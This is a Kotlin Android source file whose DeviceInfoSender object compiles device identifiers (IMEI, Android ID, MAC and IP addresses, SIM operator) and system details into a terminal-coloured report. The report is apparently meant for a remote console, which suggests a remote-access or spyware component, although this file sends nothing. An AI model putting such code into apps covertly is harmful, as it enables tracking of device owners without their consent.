package com.example.dronzer

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import java.net.NetworkInterface
import java.util.Collections

object DeviceInfoSender {

    @SuppressLint("HardwareIds", "MissingPermission")
    fun getDeviceInfoString(context: Context): String {
        val info = StringBuilder()
        info.append("\n\u001b[1;33m--- DETAILED DEVICE INFO ---\u001b[0m\n")

        // Basic Info
        info.append("Model: ${Build.MODEL}\n")
        info.append("Manufacturer: ${Build.MANUFACTURER}\n")
        info.append("Brand: ${Build.BRAND}\n")
        info.append("Device: ${Build.DEVICE}\n")
        info.append("Product: ${Build.PRODUCT}\n")
        info.append("Hardware: ${Build.HARDWARE}\n")
        info.append("Board: ${Build.BOARD}\n")
        info.append("Bootloader: ${Build.BOOTLOADER}\n")
        info.append("Radio Version: ${Build.getRadioVersion() ?: "Unknown"}\n")
        
        // Unique IDs
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        info.append("Android ID: $androidId\n")

        // Telephony / IMEI
        info.append("\n\u001b[1;36m[TELEPHONY INFO]\u001b[0m\n")
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        info.append("Operator: ${tm.networkOperatorName}\n")
        info.append("Sim State: ${getSimStateString(tm.simState)}\n")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                info.append("IMEI 1: ${tm.getImei(0) ?: "N/A"}\n")
                info.append("IMEI 2: ${tm.getImei(1) ?: "N/A"}\n")
            } else {
                @Suppress("DEPRECATION")
                info.append("IMEI: ${tm.deviceId ?: "N/A"}\n")
            }
        } catch (e: Exception) {
            info.append("IMEI: Restricted (Android 10+ Privacy)\n")
        }

        // OS Info
        info.append("\n\u001b[1;36m[OS INFO]\u001b[0m\n")
        info.append("Android Version: ${Build.VERSION.RELEASE}\n")
        info.append("SDK API Level: ${Build.VERSION.SDK_INT}\n")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            info.append("Security Patch: ${Build.VERSION.SECURITY_PATCH}\n")
        }
        info.append("Build ID: ${Build.ID}\n")
        info.append("Kernel Version: ${System.getProperty("os.version")}\n")

        // Battery Info
        info.append("\n\u001b[1;36m[BATTERY INFO]\u001b[0m\n")
        val batteryStatus: Intent? = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        batteryStatus?.let {
            val level = it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = it.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val batteryPct = if (scale > 0) level * 100 / scale.toFloat() else 0f
            val status = it.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            
            info.append("Level: $batteryPct%\n")
            info.append("Charging: $isCharging\n")
            val technology = it.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY)
            info.append("Technology: $technology\n")
            val temperature = it.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0
            info.append("Temperature: $temperature°C\n")
            val voltage = it.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0)
            info.append("Voltage: $voltage mV\n")
        }

        // Storage Info
        info.append("\n\u001b[1;36m[STORAGE INFO]\u001b[0m\n")
        info.append("Internal Total: ${formatSize(getTotalInternalMemorySize())}\n")
        info.append("Internal Free: ${formatSize(getAvailableInternalMemorySize())}\n")

        // Network Info
        info.append("\n\u001b[1;36m[NETWORK INFO]\u001b[0m\n")
        info.append("IP Address: ${getIPAddress(true)}\n")
        info.append("MAC Address: ${getMacAddress()}\n")

        // Display Info
        info.append("\n\u001b[1;36m[DISPLAY INFO]\u001b[0m\n")
        val metrics = context.resources.displayMetrics
        info.append("Resolution: ${metrics.widthPixels}x${metrics.heightPixels}\n")
        info.append("Density DPI: ${metrics.densityDpi}\n")

        info.append("\u001b[1;33m----------------------------\u001b[0m\n")
        return info.toString()
    }

    private fun getSimStateString(state: Int): String {
        return when (state) {
            TelephonyManager.SIM_STATE_ABSENT -> "Absent"
            TelephonyManager.SIM_STATE_READY -> "Ready"
            TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN Required"
            TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK Required"
            TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "Network Locked"
            else -> "Unknown"
        }
    }

    private fun getAvailableInternalMemorySize(): Long {
        val path = Environment.getDataDirectory()
        val stat = StatFs(path.path)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            stat.availableBlocksLong * stat.blockSizeLong
        } else {
            @Suppress("DEPRECATION")
            stat.availableBlocks.toLong() * stat.blockSize.toLong()
        }
    }

    private fun getTotalInternalMemorySize(): Long {
        val path = Environment.getDataDirectory()
        val stat = StatFs(path.path)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            stat.blockCountLong * stat.blockSizeLong
        } else {
            @Suppress("DEPRECATION")
            stat.blockCount.toLong() * stat.blockSize.toLong()
        }
    }

    private fun formatSize(size: Long): String {
        var s = size.toDouble()
        val kb = 1024.0
        val mb = kb * kb
        val gb = mb * kb
        return when {
            s >= gb -> String.format("%.2f GB", s / gb)
            s >= mb -> String.format("%.2f MB", s / mb)
            s >= kb -> String.format("%.2f KB", s / kb)
            else -> String.format("%d B", size)
        }
    }

    private fun getIPAddress(useIPv4: Boolean): String {
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress) {
                        val sAddr = addr.hostAddress ?: continue
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (useIPv4) {
                            if (isIPv4) return sAddr
                        } else {
                            if (!isIPv4) {
                                val delim = sAddr.indexOf('%')
                                return if (delim < 0) sAddr.uppercase() else sAddr.substring(0, delim).uppercase()
                            }
                        }
                    }
                }
            }
        } catch (ignored: Exception) {
        }
        return "Unknown"
    }

    private fun getMacAddress(): String {
        try {
            val all = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (nif in all) {
                if (nif.name.contains("wlan", true) || nif.name.contains("eth", true)) {
                    val macBytes = nif.hardwareAddress ?: continue
                    val res1 = StringBuilder()
                    for (b in macBytes) {
                        res1.append(String.format("%02X:", b))
                    }
                    if (res1.isNotEmpty()) {
                        res1.deleteCharAt(res1.length - 1)
                    }
                    return res1.toString()
                }
            }
        } catch (ex: Exception) {
        }
        return "Restricted (API 30+)"
    }
}
